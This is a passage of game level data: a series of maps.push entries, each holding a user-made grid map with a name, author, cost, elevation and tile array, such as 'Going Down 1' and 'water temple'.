maps.push({name="Going Down 1",author="TF2 Pencil",id="#1662177407",direction="forward",cost=163,elevation=-12,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,43,43,42,41,40,39,39,0,35,34,33,32,31,31,0,0,0,23,23,0,43,43,42,41,40,39,39,0,35,34,33,32,31,31,0,0,0,0,0,1,1,1,1,1,1,0,0,0,35,34,33,32,31,31,0,0,0,43,43,1,100,39,0,39,0,39,39,0,35,34,33,32,31,31,0,0,0,43,43,1,39,39,39,0,0,39,39,0,35,34,33,32,31,31,0,0,0,42,42,1,39,39,0,0,0,0,0,0,35,34,33,32,31,31,0,0,0,41,41,1,0,39,0,0,0,38,38,0,35,34,33,32,31,31,0,0,0,40,40,1,39,0,0,0,0,38,38,0,35,34,33,32,31,31,0,0,0,39,39,1,0,0,0,0,0,37,37,0,35,34,33,32,31,31,0,0,0,39,39,0,39,39,0,38,37,36,36,0,35,34,33,32,31,31,0,0,0,39,39,0,39,39,0,38,37,36,36,0,35,34,33,32,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Going down type",author="TF2 Pencil",id="#1662177505",direction="right",cost=259,elevation=-17,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,1,99,131,1,105,105,105,105,105,105,105,105,2,0,22,22,0,0,0,0,1,32,32,1,105,105,105,105,105,105,105,105,2,0,22,22,0,0,0,0,1,32,32,1,105,105,0,0,0,0,105,0,0,0,22,22,0,0,0,0,1,0,0,1,105,105,105,105,105,105,105,0,0,0,22,22,0,0,0,0,1,0,0,1,105,105,105,105,105,105,105,0,0,1,22,22,0,0,0,0,1,32,32,1,105,105,0,0,0,0,0,0,0,1,22,22,1,1,1,1,1,0,0,1,105,105,0,0,0,0,0,0,0,1,66,66,66,66,14,1,1,32,32,1,105,105,105,105,105,0,5,5,0,1,66,66,66,66,14,1,1,0,0,1,105,105,105,105,105,0,5,5,0,1,66,66,66,66,14,1,1,32,32,1,0,0,0,0,0,0,6,6,0,1,66,66,66,66,14,1,1,32,32,1,0,0,0,0,0,0,6,6,0,1,14,14,14,14,14,1,1,0,0,1,0,0,0,0,0,0,7,7,0,1,14,0,14,1,96,14,14,14,14,98,14,14,0,0,0,0,8,8,0,1,0,14,0,1,14,14,14,14,14,98,14,14,13,12,11,10,9,9,0,1,14,14,14,1,14,132,14,14,14,98,14,14,13,12,11,10,9,9,0,1,14,97,14,1,14,14,14,14,14,98,14,14,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Up top",author="TF2 Pencil",id="#1662177840",direction="forward",cost=257,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,39,100,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,100,39,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,39,39,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,13,13,13,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,13,125,13,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,13,13,13,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,39,39,0,0,0,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,39,100,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,100,39,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0]});
maps.push({name="Pi",author="TF2 Pencil",id="#1662179039",direction="forward",cost=78,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,32,32,32,12,12,0,0,0,0,0,0,12,0,0,0,0,0,0,0,0,0,32,32,0,12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,0,32,0,32,0,0,12,0,0,0,0,12,0,0,0,0,0,0,0,0,32,0,0,0,0,0,12,0,0,0,0,12,0,0,0,0,0,0,0,32,0,0,0,0,0,0,12,0,0,0,0,12,0,0,0,0,0,0,32,0,0,0,0,0,0,0,12,0,0,0,0,12,0,0,0,0,0,32,0,0,0,0,0,0,0,0,12,0,0,0,0,12,0,0,32,0,32,0,0,0,0,0,0,0,0,0,12,0,0,0,0,0,12,0,32,32,0,0,0,0,0,0,0,0,0,12,0,0,0,0,0,0,12,12,32,32,32,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="surely we will win",author="sivi",id="#1662195868",direction="forward",cost=330,elevation=0,map=[0,0,0,0,1,1,1,2,2,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,24,24,24,24,24,1,1,0,0,0,0,0,0,0,0,1,24,24,1,24,24,24,24,24,24,24,1,1,1,0,0,0,0,0,1,24,24,1,1,24,24,1,1,24,24,24,24,24,1,1,0,0,0,0,1,24,1,1,1,1,24,24,1,1,24,24,24,24,24,1,1,0,0,1,1,1,1,1,24,1,24,24,24,1,24,24,24,24,24,24,1,1,0,1,1,24,1,1,24,1,24,24,24,1,24,24,24,24,24,24,24,1,0,1,1,24,1,24,24,1,24,24,24,1,24,24,24,24,24,24,24,24,1,1,1,24,1,24,1,24,24,24,24,1,24,24,24,24,1,1,24,24,1,1,1,24,24,1,24,24,24,24,24,1,24,24,24,24,24,1,1,24,1,1,1,24,24,24,24,24,24,24,24,1,24,24,24,24,24,24,1,24,1,1,1,1,1,1,1,24,24,24,24,1,24,24,24,24,24,24,1,24,1,1,1,1,1,24,24,1,24,24,24,1,24,24,24,24,24,24,1,24,1,0,1,1,1,1,24,1,24,24,24,1,24,24,24,24,24,1,1,24,1,0,1,1,1,1,24,1,24,24,1,1,24,24,24,1,1,1,24,24,1,0,0,1,1,24,24,1,24,24,1,24,24,1,1,1,24,24,24,24,1,0,0,0,0,1,1,24,24,24,1,24,1,1,24,24,24,24,24,1,0,0,0,0,0,0,1,24,24,24,24,1,1,24,24,24,24,24,1,1,0,0,0,0,0,0,0,1,24,24,24,24,24,24,24,24,24,1,1,0,0,0,0,0,0,0,0,0,2,2,1,1,1,1,1,1,1,0,0,0,0]});
maps.push({name="ladder action",author="Fara",id="#1662200685",direction="forward",cost=192,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,20,93,100,131,20,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,20,20,20,20,20,0,0,0,0,0,0,0,0,5,5,90,5,0,0,0,0,0,14,65,14,0,14,0,3,3,3,3,0,5,5,5,5,0,0,0,0,0,0,0,0,0,14,1,1,1,1,1,0,5,5,89,5,0,0,1,1,0,0,3,1,0,0,1,0,0,0,0,0,5,5,5,5,0,0,1,65,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,90,0,0,1,6,65,0,0,0,0,3,1,0,0,0,0,0,90,5,5,5,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,1,0,0,0,3,1,0,3,1,0,0,0,0,0,5,5,5,5,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,1,6,65,0,0,0,0,3,1,0,0,0,0,0,5,90,5,5,0,0,1,65,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,1,1,0,0,3,1,0,3,1,0,0,0,0,31,45,45,45,45,31,0,0,0,0,0,0,0,14,1,1,0,0,11,31,31,45,89,45,45,31,31,11,0,0,0,0,0,14,0,3,0,0,0,0,31,45,45,45,45,31,0,0,0,0,0,3,1,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,3,0,0,3,0,0,0,0,0,0,0,0,0,5,132,5,90,22,94,22,1,0,0,1,0,0,0,0,0,0,0,0,0,5,2,2,5,93,22,93,0,0,0,0,0]});
maps.push({name="on diagonal",author="Fara",id="#1662207122",direction="forward",cost=288,elevation=0,map=[1,1,2,2,16,0,0,0,0,0,0,67,23,43,43,43,23,43,43,23,1,1,16,16,16,17,0,0,0,0,0,0,0,0,0,0,0,43,93,43,100,98,1,17,17,17,18,0,0,0,0,0,0,0,0,0,67,23,43,43,98,97,17,1,18,18,18,19,0,0,0,0,0,0,0,0,0,67,0,23,16,16,17,18,1,19,19,19,20,0,0,67,0,92,0,0,0,0,0,43,0,17,17,18,19,1,20,20,20,21,0,23,43,43,43,0,0,0,0,43,0,0,18,18,19,20,1,21,21,21,22,22,1,1,43,92,0,0,0,43,0,0,0,19,19,20,21,1,22,22,22,22,22,1,43,0,0,0,0,23,0,0,0,0,20,20,21,22,22,22,22,22,22,22,23,67,0,0,0,67,0,0,0,0,0,21,21,22,22,22,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,22,22,22,21,21,0,0,0,0,0,67,0,0,0,67,23,22,22,22,22,22,22,22,21,20,20,0,0,0,0,23,0,0,0,0,43,1,22,22,22,22,22,1,21,20,19,19,0,0,0,43,0,0,0,92,43,1,1,22,22,21,21,21,1,20,19,18,18,0,0,43,0,0,0,0,43,43,43,23,0,21,20,20,20,1,19,18,17,17,0,43,0,0,0,0,0,92,0,67,0,0,20,19,19,19,1,18,17,16,16,23,0,67,0,0,0,0,0,0,0,0,0,19,18,18,18,1,17,99,96,43,43,23,67,0,0,0,0,0,0,0,0,0,18,17,17,17,1,96,100,43,93,43,0,0,0,0,0,0,0,0,0,0,0,17,16,16,16,1,1,23,43,43,23,43,43,43,23,67,0,0,0,0,0,0,16,2,2,1,1]});
maps.push({name="NameAThingWorseThan",author="Fara",id="#1662207836",direction="forward",cost=344,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,67,67,67,0,0,0,5,5,5,5,5,5,0,0,0,67,67,67,0,0,1,23,23,0,0,5,5,5,5,5,5,5,5,0,0,23,23,1,0,0,23,100,23,3,5,5,5,5,5,5,5,5,5,5,3,23,100,23,0,0,1,23,23,0,5,5,5,5,5,5,5,5,5,5,0,23,23,1,0,0,67,67,67,0,5,5,70,70,70,70,70,70,5,5,0,67,67,67,0,0,0,0,0,0,5,5,70,70,70,70,70,70,5,5,0,0,0,0,0,0,0,0,0,0,5,5,70,70,70,70,70,70,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,5,5,76,76,76,76,76,76,5,5,0,0,0,0,0,0,0,0,0,0,5,5,76,76,76,76,76,76,5,5,0,0,0,0,0,0,67,67,67,0,5,5,76,76,76,76,76,76,5,5,0,67,67,67,0,0,1,23,23,0,5,5,5,5,5,5,5,5,5,5,0,23,23,1,0,0,23,100,23,3,5,5,5,5,5,5,5,5,5,5,3,23,100,23,0,0,1,23,23,0,0,5,5,5,5,5,5,5,5,0,0,23,23,1,0,0,67,67,67,0,0,0,5,5,5,5,5,5,0,0,0,67,67,67,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0]});
maps.push({name="Jump Around",author="sivi",id="#1662214706",direction="forward",cost=386,elevation=0,map=[0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,0,0,0,1,93,11,11,5,5,5,5,5,5,11,11,94,1,5,5,1,0,0,0,1,11,100,11,5,131,5,5,131,5,11,100,11,1,5,5,1,0,0,0,1,11,11,11,5,5,5,5,5,5,11,11,11,1,5,5,1,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,1,6,6,1,0,0,0,1,5,131,5,5,131,5,5,131,5,5,131,5,1,7,7,1,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,1,8,8,1,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,1,9,9,1,0,0,0,1,5,131,5,5,131,5,5,131,5,5,131,5,1,10,10,1,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,3,11,11,11,1,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,3,11,11,11,1,0,0,0,1,5,131,5,5,131,5,5,131,5,5,131,5,1,10,10,1,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,1,9,9,1,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,1,8,8,1,0,0,0,1,5,131,5,5,131,5,5,131,5,5,131,5,1,7,7,1,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,1,6,6,1,0,0,0,1,11,11,11,5,5,5,5,5,5,11,11,11,1,5,5,1,0,0,0,1,11,100,11,5,131,5,5,131,5,11,100,11,1,5,5,1,0,0,0,1,94,11,11,5,5,5,5,5,5,11,11,93,1,5,5,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,0,0]});
maps.push({name="niapS",author="Escalope",id="#1662230820",direction="left",cost=585,elevation=-19,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,93,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,0,76,0,65,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,31,91,65,34,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,31,65,65,65,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,31,0,65,128,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,0,76,0,65,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,1,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,2,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,44,1,2,25,25,26,27,28,29,76,76,76,76,76,76,36,38,40,42,44,94,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Perfect Squares",author="TF2 Pencil",id="#1662240003",direction="right",cost=156,elevation=-10,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,36,36,36,0,35,35,35,35,0,0,0,0,42,0,0,0,0,0,36,36,36,36,36,0,35,35,35,35,0,0,0,0,0,0,0,0,0,0,36,36,36,36,36,0,35,35,35,35,0,0,0,41,41,0,0,0,0,0,36,36,36,36,36,0,35,35,35,35,0,0,0,41,41,0,0,0,0,0,36,36,36,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,0,0,40,40,40,0,0,0,37,37,37,37,37,37,0,0,0,34,34,34,0,0,40,40,40,0,0,0,37,37,37,37,37,37,0,0,0,34,34,34,0,0,40,40,40,0,0,0,37,37,37,37,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,37,37,37,37,0,0,0,0,0,33,33,0,39,39,39,39,0,0,37,37,37,37,37,37,0,0,0,0,0,33,33,0,39,39,39,39,0,0,37,37,37,37,37,37,0,0,0,0,0,0,0,0,39,39,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,39,39,39,39,0,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,0,0,0,0,0,0,0,12,12,2,0,0,0,0,0,38,38,38,38,38,0,0,0,0,0,0,0,12,12,2,0,0,0,0,0,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Platform Jumps",author="Not Me",id="#1662243006",direction="right",cost=108,elevation=19,map=[0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,12,11,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,10,0,5,5,0,0,0,24,24,0,24,24,0,24,24,0,0,0,15,0,9,0,5,5,0,0,0,24,24,0,24,24,0,24,24,0,0,0,16,0,8,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,0,7,6,5,5,0,0,0,24,24,0,0,0,0,24,24,0,0,0,18,0,0,0,0,0,0,0,0,24,24,0,0,0,0,24,24,0,0,0,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,24,24,0,24,24,0,0,0,0,24,24,24,2,0,19,0,0,24,24,0,24,24,0,24,24,0,0,0,0,24,24,24,2,0,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,24,0,24,24,0,24,24,0,24,24,0,24,24,0,24,0,0,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,0,21,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,0,0,22,23,23,24,24,24,24,0,24,24,0,24,24,0,24,24,0,24,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="defend for buttons",author="blasian",id="#1662309848",direction="forward",cost=262,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,14,93,95,14,14,95,93,14,90,0,0,0,0,0,0,0,0,0,0,14,77,77,77,14,14,77,77,77,14,0,0,0,0,0,0,0,0,0,0,14,77,77,77,90,14,77,77,77,14,0,0,0,0,0,0,0,0,0,0,14,77,77,77,14,90,77,77,77,14,0,0,0,0,0,0,0,0,0,0,95,77,77,77,14,14,77,77,77,95,0,0,0,0,0,0,0,93,14,14,100,95,14,14,14,14,14,14,95,100,14,14,93,0,0,0,0,0,0,0,95,77,77,77,14,14,77,77,77,95,0,0,0,0,0,0,0,0,0,0,14,77,77,77,14,90,77,77,77,14,0,0,0,0,0,0,0,0,0,0,14,77,77,77,90,14,77,77,77,14,0,0,0,0,0,0,0,0,0,0,14,77,77,77,14,14,77,77,77,14,0,0,0,0,0,0,0,0,0,0,90,14,93,14,14,14,14,93,14,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="water temple",author="blasian",id="#1662310235",direction="forward",cost=410,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,1,14,14,1,14,14,14,14,14,14,14,0,0,14,14,14,14,14,14,1,1,66,66,1,1,14,14,14,14,14,14,0,0,14,14,14,14,14,1,1,91,66,66,91,1,1,14,14,14,14,14,0,0,14,14,14,14,1,1,91,91,66,66,91,91,1,1,14,14,14,14,0,0,14,14,14,1,1,91,91,14,14,14,14,91,91,1,1,14,14,14,0,0,14,14,1,1,91,91,65,65,65,65,65,14,91,91,1,1,14,14,0,0,14,1,1,91,91,90,65,90,65,90,65,14,90,91,91,1,1,14,0,0,1,1,94,95,14,14,65,65,65,65,65,14,14,14,95,94,1,1,0,0,93,14,14,95,14,14,65,65,65,65,65,14,14,14,95,14,14,93,0,0,93,14,14,95,14,14,65,90,65,90,65,14,14,14,95,14,14,93,0,0,1,1,1,1,1,90,65,65,65,65,65,14,90,1,1,1,1,1,0,0,1,1,1,1,1,14,14,14,14,14,14,14,14,1,1,1,1,1,0,0,93,14,14,14,14,95,14,90,14,14,90,14,95,14,14,14,14,93,0,0,14,14,14,14,14,14,1,1,66,66,1,1,14,14,14,14,14,14,0,0,14,14,14,14,14,14,14,1,14,14,1,14,14,14,14,14,14,14,0,0,14,14,14,14,14,14,14,1,14,14,1,14,14,14,14,14,14,14,0,0,14,14,14,14,14,14,14,1,14,14,1,14,14,14,14,14,14,14,0,0,100,14,14,14,14,14,93,1,100,100,1,93,14,14,14,14,14,100,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="up or down",author="blasian",id="#1662310481",direction="right",cost=83,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,14,14,0,0,100,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,3,14,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,2,0,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,2,0,0,0,0,0,0,132,20,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,131,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,20,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="defend for candy",author="blasian",id="#1662310772",direction="forward",cost=170,elevation=10,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,24,93,93,24,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,24,93,93,24,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,95,95,95,95,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,24,93,93,24,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,95,95,95,95,0,0,0,0,0,0,0,0,0,131,133,0,0,0,0,0,24,93,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,95,95,0,0,0,0,0,0,0,0,0,0,0,0,21,22,23,23,24,24,24,24,23,22,21,0,0,0,0,0,0,0,0,0,20,0,0,0,24,24,24,24,0,0,20,0,0,0,0,0,0,0,0,0,19,0,0,0,90,24,24,24,0,0,19,0,0,0,0,0,0,0,0,0,18,0,0,0,24,24,24,90,0,0,18,0,0,0,0,0,0,0,0,0,17,0,0,0,24,90,24,24,0,0,17,0,0,0,0,0,0,0,0,1,16,1,0,0,24,24,24,24,0,1,16,1,0,0,0,0,0,0,0,1,15,1,0,0,24,24,90,24,0,1,15,1,0,0,0,0,0,0,0,1,14,1,0,0,90,24,24,24,0,1,14,1,0,0,0,0,0,0,0,1,132,1,0,0,24,24,24,90,0,1,134,1,0,0,0,0,0,0,0,1,1,1,0,0,24,90,24,24,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Duality",author="Blasian",id="#1662311124",direction="forward",cost=562,elevation=0,map=[0,77,77,77,77,77,77,0,2,2,0,67,67,67,67,67,67,67,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,14,14,14,14,77,77,77,14,14,67,67,67,14,14,14,14,14,0,0,0,14,14,14,77,77,93,77,14,14,67,93,67,67,14,14,14,14,0,0,0,14,14,77,77,14,14,77,14,14,67,14,14,67,67,14,14,14,0,0,0,14,77,77,14,14,14,77,14,14,67,14,14,14,67,67,14,14,0,0,0,14,14,14,14,14,14,77,14,14,67,14,14,14,14,67,67,14,0,0,0,14,14,14,14,14,14,77,14,14,67,14,14,14,14,14,14,14,0,0,0,77,14,14,14,14,14,77,14,14,67,14,14,14,14,14,14,67,0,0,0,77,77,14,14,14,14,77,96,96,67,14,14,14,14,14,67,67,0,0,0,93,77,77,14,14,14,77,14,14,67,14,14,14,14,67,67,93,0,0,0,14,14,77,77,14,14,77,14,14,67,14,14,14,67,67,14,14,0,0,0,14,14,14,77,77,14,77,14,14,67,14,14,67,67,14,14,14,0,0,0,14,14,14,14,14,14,77,14,14,67,14,14,14,14,14,14,14,0,0,0,14,77,95,95,77,77,77,14,14,67,67,67,95,95,67,14,14,0,0,0,14,77,14,14,14,14,77,14,14,67,14,14,14,14,67,14,14,0,0,0,14,77,14,14,14,14,77,14,14,67,14,14,14,14,67,14,14,0,0,0,14,77,14,14,14,14,14,14,14,14,14,14,14,14,67,14,14,0,0,0,14,77,14,14,14,14,97,14,14,100,14,14,14,14,67,14,14,0,0,0,77,77,77,77,77,77,0,2,2,0,67,67,67,67,67,67,67,0,0]});
maps.push({name="Boring Uphill",author="TF2 Pencil",id="#1662316103",direction="forward",cost=216,elevation=19,map=[2,2,0,0,9,9,10,11,12,12,0,0,19,19,20,21,22,22,0,0,5,5,0,0,9,9,10,11,12,12,0,0,19,19,20,21,22,22,0,0,5,5,0,0,9,9,0,0,13,13,0,0,19,19,0,0,23,23,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9